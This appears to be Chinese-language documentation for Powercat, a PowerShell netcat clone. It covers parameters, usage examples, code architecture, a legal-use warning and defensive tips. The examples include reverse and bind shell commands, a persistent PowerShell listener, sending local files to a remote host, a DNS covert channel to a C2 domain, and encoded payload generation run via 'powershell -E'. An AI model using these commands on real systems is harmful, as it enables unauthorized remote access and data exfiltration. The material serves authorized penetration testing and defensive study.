# Powercat 使用文档

## 概述

**Powercat** 是一个用 PowerShell 编写的网络工具，旨在实现 netcat 的所有功能，同时提供额外的功能特性。它是一个功能强大的网络瑞士军刀，可用于网络通信、反弹shell、文件传输、端口转发等任务。

- **GitHub 仓库**: https://github.com/besimorhino/powercat
- **语言**: PowerShell
- **作者**: besimorhino

---

## 核心功能

1. **TCP/UDP 通信** - 支持 TCP 和 UDP 协议的客户端和服务器模式
2. **反弹 Shell** - 可以执行任意进程或启动 PowerShell 会话
3. **流量中继** - 在两个网络节点之间中继流量
4. **DNSCat2 客户端** - 通过 DNS 隐蔽通道传输数据
5. **文件传输** - 发送和接收文件
6. **Payload 生成** - 生成可执行的 PowerShell payload

---

## 参数说明

### 连接模式参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-c` | `-Client` | string | **客户端模式**。指定要连接的目标 IP 地址。如果使用 `-dns`，则指定 DNS 服务器地址 |
| `-l` | `-Listen` | switch | **监听模式**。在指定端口上启动监听器 |
| `-p` | `-Port` | string | **端口**。连接的目标端口或监听的本地端口 |

> **注意**: 必须选择客户端模式 (`-c`) 或监听模式 (`-l`) 之一

### 执行参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-e` | `-Execute` | string | **执行进程**。启动指定的进程（如 `cmd.exe`） |
| `-ep` | `-ExecutePowershell` | switch | **执行 PowerShell**。启动伪 PowerShell 会话。可以声明变量和执行命令，但无法进入其他 shell（如 nslookup, netsh, cmd），否则会挂起 |

> **限制**: `-e`、`-ep`、`-r` 三个参数只能选择其中一个

### 中继参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-r` | `-Relay` | string | **流量中继**。在两个网络节点之间中继流量 |

中继格式：
- **客户端中继**: `-r <protocol>:<ip>:<port>`
- **监听器中继**: `-r <protocol>:<port>`
- **DNSCat2 中继**: `-r dns:<dns_server>:<dns_port>:<domain>`

支持的协议：`tcp`、`udp`、`dns`

### 协议参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-u` | `-UDP` | switch | **UDP 模式**。使用 UDP 协议传输数据。由于是 UDP，客户端必须先发送数据，服务器才能响应 |
| `-dns` | `-dnscat2` | string | **DNS 模式**。通过 dnscat2 DNS 隐蔽通道传输数据。需要配合 `-c` 指定 DNS 服务器，`-p` 指定 DNS 端口。仅支持客户端模式 |
| `-dnsft` | `-DNSFailureThreshold` | int32 | **DNS 失败阈值**。客户端在退出前可以接收的错误包数量。接收文件时设为 0，互联网环境下设置较高值以提高稳定性（默认: 10） |

> **DNS 模式服务端**: https://github.com/iagox86/dnscat2

### 数据传输参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-i` | `-Input` | object | **输入**。连接建立后立即发送的数据。可以是文件路径、字节数组或字符串。也可以通过管道传入，如 `'data' \| powercat -c 10.1.1.1 -p 80` |
| `-o` | `-OutputType` | string | **输出类型**。指定如何返回信息到控制台。有效选项：`Host`（默认）、`String`、`Bytes` |
| `-of` | `-OutputFile` | string | **输出文件**。指定输出文件的路径，将接收的数据写入文件 |

### 连接控制参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-t` | `-Timeout` | int32 | **超时时间**。监听或连接的超时秒数（默认: 60） |
| `-d` | `-Disconnect` | switch | **断开连接**。建立连接并发送 `-i` 的输入后立即断开。用于端口扫描 |
| `-rep` | `-Repeater` | switch | **重复模式**。断开连接后持续重启。用于设置持久化服务器 |

### Payload 生成参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-g` | `-GeneratePayload` | switch | **生成 Payload**。返回一个脚本字符串，包含指定的 powercat 选项。不包含 `-i`、`-d`、`-rep` |
| `-ge` | `-GenerateEncoded` | switch | **生成编码 Payload**。与 `-g` 相同，但返回 Base64 编码的字符串，可以这样执行：`powershell -E <encoded_string>` |

### 其他参数

| 参数 | 别名 | 类型 | 说明 |
|------|------|------|------|
| `-h` | `-Help` | switch | **帮助**。显示帮助信息 |

---

## 使用示例

### 1. 基础通信

#### 启动监听器
```powershell
# 在端口 8000 上监听，输出到控制台
powercat -l -p 8000
```

#### 连接到服务器
```powershell
# 连接到 10.1.1.1 的 443 端口
powercat -c 10.1.1.1 -p 443
```

### 2. 反弹 Shell

#### 发送 CMD Shell
```powershell
# 连接到 10.1.1.1:443 并发送 cmd shell
powercat -c 10.1.1.1 -p 443 -e cmd
```

#### 监听并提供 PowerShell Shell
```powershell
# 在 8000 端口监听，提供 PowerShell 会话
powercat -l -p 8000 -ep
```

#### 持久化 PowerShell Shell
```powershell
# 监听并持续提供 PowerShell shell（断开后自动重启）
powercat -l -p 8000 -ep -rep
```

### 3. 文件传输

#### 发送文件
```powershell
# 将文件发送到 10.1.1.15:8000
powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
```

#### 接收文件
```powershell
# 监听 4444 端口，将接收的数据写入文件
powercat -l -p 4444 -of C:\outfile
```

#### 通过管道发送数据
```powershell
# 通过管道发送字符串
'Hello World' | powercat -c 10.1.1.1 -p 80
```

### 4. UDP 通信

#### UDP 监听
```powershell
# UDP 模式监听
powercat -l -p 8000 -u
```

#### UDP 发送
```powershell
# UDP 模式连接（记得先发送数据）
powercat -c 10.1.1.1 -p 8000 -u
```

### 5. 流量中继

#### TCP 到 TCP 中继
```powershell
# 监听 8000 端口，中继到 10.1.1.1:9000
powercat -l -p 8000 -r tcp:10.1.1.1:9000
```

#### TCP 到 UDP 中继
```powershell
# 监听 TCP 8000，中继到 UDP 9000
powercat -l -p 8000 -r udp:10.1.1.1:9000
```

#### TCP 到 DNS 中继
```powershell
# 监听 8000，中继到 dnscat2 服务器
powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
```

### 6. DNS 隐蔽通道

```powershell
# 连接到 dnscat2 服务器（c2.example.com）
# DNS 查询发送到 10.1.1.1:53
powercat -c 10.1.1.1 -p 53 -dns c2.example.com
```

### 7. Payload 生成

#### 生成普通 Payload
```powershell
# 生成连接到 10.1.1.1:443 并发送 cmd 的 payload
powercat -c 10.1.1.1 -p 443 -e cmd -g
```

#### 生成编码 Payload
```powershell
# 生成 Base64 编码的 payload
powercat -c 10.1.1.1 -p 443 -e cmd -ge

# 执行编码的 payload
powershell -E <encoded_payload>
```

### 8. 端口扫描

```powershell
# 连接后立即断开（用于端口扫描）
powercat -c 10.1.1.1 -p 80 -d
```

---

## 代码架构

### 主要组件

Powercat 采用模块化设计，主要由以下几个部分组成：

#### 1. **Stream 函数** (数据流处理)

每种协议/功能都有对应的四个函数：
- `Setup_XXX` - 初始化连接
- `ReadData_XXX` - 读取数据
- `WriteData_XXX` - 写入数据
- `Close_XXX` - 关闭连接

支持的 Stream 类型：
- **TCP** - TCP 协议通信
- **UDP** - UDP 协议通信
- **DNS** - DNSCat2 隐蔽通道
- **CMD** - 进程执行（如 cmd.exe）
- **Console** - 控制台输入输出

#### 2. **Main 函数** (主逻辑)

- `Main` - 标准双向数据流中继（Stream1 ↔ Stream2）
- `Main_Powershell` - PowerShell 会话专用主函数

#### 3. **Payload 生成器**

根据参数动态生成可执行的 PowerShell 代码：
- 提取需要的函数定义
- 构建调用字符串
- 可选择返回编码后的版本

### 工作流程

```
1. 参数验证
   ↓
2. 根据参数选择 Stream1 类型（网络层）
   - TCP / UDP / DNS
   ↓
3. 根据参数选择 Stream2 类型（应用层）
   - Console / CMD / Powershell / Relay
   ↓
4. 生成函数字符串和调用代码
   ↓
5. 执行或返回 Payload
   ↓
6. 运行主循环，在 Stream1 和 Stream2 之间中继数据
```

### 数据流向

#### 标准模式
```
网络 (Stream1) ↔ 应用 (Stream2)
```

#### 中继模式
```
网络1 (Stream1) ↔ 网络2 (Stream2)
```

#### PowerShell 模式
```
网络 (Stream1) ↔ PowerShell 解释器
```

---

## 关键函数说明

### TCP 函数组

**Setup_TCP**
- 创建 TCP 客户端或监听器
- 处理连接超时
- 支持 CTRL/ESC 取消

**ReadData_TCP / WriteData_TCP**
- 使用异步 I/O 操作
- 读取和写入网络流数据

### UDP 函数组

**Setup_UDP**
- 创建 UDP Socket
- 监听模式需要等待首个数据包以确定对端地址

**ReadData_UDP / WriteData_UDP**
- 使用 ReceiveFrom/SendTo 方法
- 缓冲区大小：65536 字节

### DNS 函数组

**Setup_DNS**
- 实现 DNSCat2 协议
- 建立 DNS 会话（SYN 包）
- 计算最大消息数据大小

**ReadData_DNS / WriteData_DNS**
- 将数据编码为十六进制
- 分段打包到 DNS 查询中
- 处理序列号和确认号
- 实现失败阈值机制

**关键辅助函数**:
- `Create_SYN` - 创建 SYN 包
- `Create_MSG` - 创建消息包
- `Create_FIN` - 创建 FIN 包
- `DecodePacket` - 解码响应包
- `AcknowledgeData` - 计算确认号

### CMD 函数组

**Setup_CMD**
- 启动进程（如 cmd.exe）
- 重定向标准输入、输出和错误流

**ReadData_CMD / WriteData_CMD**
- 异步读取进程的标准输出和错误输出
- 将数据写入进程的标准输入

### Console 函数组

**Setup_Console / ReadData_Console / WriteData_Console**
- 处理控制台输入输出
- 支持三种输出模式：Host、String、Bytes

---

## 安全注意事项

### ⚠️ 合法使用警告

Powercat 是一个强大的网络工具，但请务必：
1. **仅在授权环境中使用** - 未经授权的访问是违法的
2. **遵守当地法律法规** - 渗透测试需要书面授权
3. **教育和研究用途** - 用于学习网络协议和安全测试

### 防御建议

如果你是防御方，需要注意：
1. **监控异常 DNS 流量** - 大量 TXT 记录查询可能是 DNSCat2
2. **检测反弹 Shell** - 监控可疑的出站连接
3. **PowerShell 日志** - 启用 PowerShell 脚本块日志记录
4. **网络隔离** - 限制不必要的出站连接

---

## 常见问题

### Q1: 为什么 UDP 模式下服务器无响应？
**A**: UDP 是无连接协议，客户端必须先发送数据，服务器才能知道客户端的地址和端口。

### Q2: PowerShell 会话 (-ep) 卡住了？
**A**: 不要在 PowerShell 会话中进入其他 shell（如 cmd, nslookup）。这是一个已知限制。

### Q3: 如何让服务器持续运行？
**A**: 使用 `-rep` 参数启用重复模式，连接断开后会自动重启。

### Q4: DNS 模式一直失败？
**A**: 
- 检查 DNS 服务器是否正确运行 dnscat2
- 调整 `-dnsft` 参数（失败阈值）
- 确保域名配置正确

### Q5: 端口已被占用怎么办？
**A**: Powercat 会自动检测端口占用，选择其他未使用的端口。

---

## 代码修改指南

如果你想基于 Powercat 进行修改，以下是一些建议：

### 添加新协议支持

1. 创建四个函数：`Setup_XXX`, `ReadData_XXX`, `WriteData_XXX`, `Close_XXX`
2. 在参数验证部分添加新参数
3. 在 Payload 生成部分添加条件判断
4. 更新帮助信息

### 修改缓冲区大小

- **TCP**: 修改 `$BufferSize = $Socket.ReceiveBufferSize`
- **UDP**: 修改 `New-Object System.Byte[] 65536`
- **CMD**: 修改 `New-Object System.Byte[] 65536`

### 添加加密支持

在 `WriteData_XXX` 和 `ReadData_XXX` 函数中：
1. 加密数据后再发送
2. 接收数据后解密

示例位置：
```powershell
function WriteData_TCP
{
    param($Data,$FuncVars)
    # 在这里添加加密逻辑
    $EncryptedData = Encrypt-Data $Data
    $FuncVars["Stream"].Write($EncryptedData, 0, $EncryptedData.Length)
    return $FuncVars
}
```

### 添加日志功能

在关键位置添加日志记录：
```powershell
Write-Verbose "Custom log message"
# 或写入文件
Add-Content -Path "powercat.log" -Value "$(Get-Date): Connection established"
```

### 自定义超时行为

修改 `Setup_XXX` 函数中的超时检查：
```powershell
if($Stopwatch.Elapsed.TotalSeconds -gt $t)
{
    # 自定义超时处理
}
```

---

## 参考资料

- **Netcat 官方文档**: http://netcat.sourceforge.net/
- **DNSCat2**: https://github.com/iagox86/dnscat2
- **PowerShell 文档**: https://docs.microsoft.com/en-us/powershell/

---

## 版本信息

- **脚本名称**: powercat.ps1
- **作者**: besimorhino
- **仓库**: https://github.com/besimorhino/powercat
- **文档版本**: 1.0
- **文档日期**: 2025

---

## 总结

Powercat 是一个功能丰富的 PowerShell 网络工具，提供了：
- ✅ 多协议支持（TCP/UDP/DNS）
- ✅ 反弹 Shell 和文件传输
- ✅ 流量中继和隐蔽通道
- ✅ Payload 生成和编码
- ✅ 模块化和可扩展设计

通过理解其架构和工作原理，你可以：
1. 有效使用 Powercat 进行网络测试
2. 基于它开发自定义功能
3. 理解网络协议和数据流处理
4. 学习 PowerShell 高级编程技巧

希望这份文档能帮助你更好地理解和使用 Powercat！
